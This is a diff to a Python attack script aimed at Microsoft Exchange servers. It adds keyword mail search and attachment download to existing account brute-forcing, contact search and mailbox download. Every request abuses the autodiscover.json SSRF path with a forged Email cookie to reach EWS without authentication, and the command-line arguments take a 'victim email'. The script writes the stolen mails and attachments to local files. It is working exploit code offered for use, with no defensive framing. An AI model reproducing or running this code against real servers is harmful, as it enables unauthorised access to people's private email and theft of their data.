@@ -9,8 +9,9 @@ from string import Template
 import xml.etree.cElementTree as ET
 from base64 import b64decode, b64encode
 import os
-
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
 
 
 def GetLegacyDN(target,email):
@@ -77,8 +78,7 @@ def Brute_Account(target,email):
     # logger.debug("[Stage 999] Brute Account With EWS ")
     soap_body = convertFromTemplate({'email':email},templatesFolder + "Brute_Account.xml")
     stage999 = requests.post(
-        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
-            target), headers={
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
             "Content-Type": "text/xml",
             "User-Agent": user_agent,
             "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu"
@@ -100,8 +100,7 @@ def SearchContact(target,sid,keyword):
     logger.debug("[Stage 888] Search Contact With ews/exchange.asmx ")
     soap_body = convertFromTemplate({'sid':sid,'keyword':keyword},templatesFolder + "SearchContact.xml")
     stage888 = requests.post(
-        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
-            target), headers={
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
             "Content-Type": "text/xml",
             "User-Agent": user_agent,
             "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
@@ -122,8 +121,7 @@ def DownloadEmails(target, sid,folder):
     logger.debug("[Stage 777] Get Mails Stage 1 Finditem ing... ")
     FindItem_body = convertFromTemplate({'sid':sid,'folder':folder},templatesFolder + "FindItem.xml")
     FindItem_request = requests.post(
-        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
-            target), headers={
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
             "Content-Type": "text/xml",
             "User-Agent": user_agent,
             "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
@@ -142,8 +140,7 @@ def DownloadEmails(target, sid,folder):
         logger.debug("[Stage 777] Get Mails Stage 2 GetItem ing... ")
         GetItem_body = convertFromTemplate(params, templatesFolder + "GetItem.xml")
         GetItem_request = requests.post(
-            "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
-                target), headers={
+            f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
                 "Content-Type": "text/xml",
                 "User-Agent": user_agent,
                 "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
@@ -166,6 +163,108 @@ def DownloadEmails(target, sid,folder):
                 print("[+] Item [{}] saved successfully".format(fileName))
         except IOError:
             print("[!] Could not write file [{}]".format(fileName))
+        DownAttachment(target,sid,item.get('Id'),i)
+        i = i + 1
+
+
+def DownAttachment(target, sid,id,i):
+    logger.debug("[Stage 555] Ready Download Attachmenting... ")
+    params2 = {'sid':sid,'Id': id}
+    GetItem_body = convertFromTemplate(params2, templatesFolder + "GetAttachmentID.xml")
+    GetItem_request = requests.post(
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                            },
+        data=GetItem_body,
+        verify=False
+        )
+    logger.debug("[Stage 555] Determine if there are attachments in the email... ")
+    if "AttachmentId" in GetItem_request.content.decode():
+        itemXML = ET.fromstring(GetItem_request.content.decode())
+        logger.debug("[Stage 555] This Mail Has Attachment... ")
+        AttachmentIds = itemXML.findall(".//t:AttachmentId", exchangeNamespace)
+        for AttachmentId in AttachmentIds:
+            # print(AttachmentId.get('Id'))
+            logger.debug("[Stage 555] Start Get Attachment Content... ")
+            Attachment_body = convertFromTemplate({'sid':sid,'AttachmentId':AttachmentId.get('Id')},templatesFolder + "GetAttachmentbody.xml")
+            Attachment_request = requests.post(
+                f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+                    "Content-Type": "text/xml",
+                    "User-Agent": user_agent,
+                    "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                                    },
+                data=Attachment_body,
+                verify=False
+                )
+            AttachmentXML = ET.fromstring(Attachment_request.content.decode())
+            AttachmentXMLname = AttachmentXML.find(".//t:Name", exchangeNamespace).text
+            AttachmentXMLcontent = AttachmentXML.find(".//t:Content", exchangeNamespace).text
+            logger.debug("[Stage 555] Start Download Attachment... ")
+            try:
+                outputDir = "output"
+                if not os.path.exists(outputDir):
+                    os.makedirs(outputDir)
+                fileName = outputDir + "/item-{}-".format(i) + AttachmentXMLname
+                with open(fileName, 'wb+') as fileHandle:
+                    fileHandle.write(b64decode(AttachmentXMLcontent))
+                    fileHandle.close()
+                    print("[+] Item [{}] saved successfully".format(fileName))
+            except IOError:
+                print("[!] Could not write file [{}]".format(fileName))
+
+
+
+
+
+def SearchMails(target, sid,folder,keyword):
+    logger.debug("[Stage 666] Search Mails Stage 1 Finditem ing... ")
+    FindItem_body = convertFromTemplate({'sid':sid,'folder':folder,'keyword':keyword},templatesFolder + "SearchMails.xml")
+    FindItem_request = requests.post(
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                            },
+        data=FindItem_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if FindItem_request.status_code != 200:
+        logger.error("[Stage 666] Request failed - Search Mails Stage 1 Finditem Error!")
+        exit()
+    folderXML = ET.fromstring(FindItem_request.content.decode())
+    i = 0
+    for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
+        params = {'sid':sid,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
+        logger.debug("[Stage 666] Get Mails Stage 2 GetItem ing... ")
+        GetItem_body = convertFromTemplate(params, templatesFolder + "GetItem.xml")
+        GetItem_request = requests.post(
+            f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+                "Content-Type": "text/xml",
+                "User-Agent": user_agent,
+                "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                                },
+            data=GetItem_body,
+            verify=False
+            )   
+        itemXML = ET.fromstring(GetItem_request.content.decode())
+        mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
+        logger.debug("[Stage 666] Search Mails Stage 3 Downloaditem ing... ")
+        try:
+            extension = "eml"
+            outputDir = "output"
+            if not os.path.exists(outputDir):
+                os.makedirs(outputDir)
+            fileName = outputDir + "/{}-item-{}.".format(keyword,i) + extension
+            with open(fileName, 'wb+') as fileHandle:
+                fileHandle.write(b64decode(mimeContent))
+                fileHandle.close()
+                print("[+] Item [{}] saved successfully".format(fileName))
+        except IOError:
+            print("[!] Could not write file [{}]".format(fileName))
+        DownAttachment(target,sid,item.get('Id'),i)
         i = i + 1
 
 
@@ -202,7 +301,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--target',required=True, help='the target Exchange Server ip')
     parser.add_argument('--email', help='victim email')
-    parser.add_argument('--action',required=True,choices=['Brute','Search','Download'], help='The action you want to take')
+    parser.add_argument('--action',required=True,choices=['Brute','SearchC','SearchM','Download'], help='The action you want to take')
     parser.add_argument("--file", help="email files with your want brute accounts")
     parser.add_argument("--keyword", help="keyword with you want search")
     parser.add_argument("--folder",default="inbox", help="folder name with you want download")
@@ -215,13 +314,18 @@ if __name__ == '__main__':
                 email = emails.strip()
                 Brute_Account(args.target, email)
 
-    elif args.target and args.email and args.action == "Search" and args.keyword:
+    elif args.target and args.email and args.action == "SearchC" and args.keyword:
         legacyDn = GetLegacyDN(args.target, args.email)
         sid = GetSID(args.target, legacyDn)
         contactinfo = SearchContact(args.target, sid, args.keyword)
-
+        
+    elif args.target and args.email and args.action == "SearchM" and args.folder and args.keyword:
+        legacyDn = GetLegacyDN(args.target, args.email)
+        sid = GetSID(args.target, legacyDn)
+        mailsresult = SearchMails(args.target, sid, args.folder,args.keyword)
 
     elif args.target and args.email and args.action == "Download" and args.folder:
         legacyDn = GetLegacyDN(args.target, args.email)
         sid = GetSID(args.target, legacyDn)
         Items = DownloadEmails(args.target, sid, args.folder)
+    
